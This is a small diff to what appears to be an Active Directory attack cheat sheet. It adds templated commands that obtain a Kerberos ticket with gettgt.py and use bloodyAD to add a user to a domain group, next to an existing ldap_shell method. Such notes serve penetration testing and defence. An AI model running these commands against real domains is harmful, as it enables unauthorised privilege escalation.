@@ -36,6 +36,12 @@ Ldap_shell -> `gettgt.py <domain>/<user>:<password>`
 
 `add_user_to_group <user> <group>`
 
+BloodyAD -> `gettgt.py <domain>/<user>:<password>`
+
+`export KRB5CCNAME=<ticket_name>`
+
+`bloodyAD --host '<dc_ip>' -d '<domain>' -u '<user>' -k --host <machine.domain> add groupMember '<group>' '<user to add in group>'`
+
 <br>
 
 ### From Windows (internally):
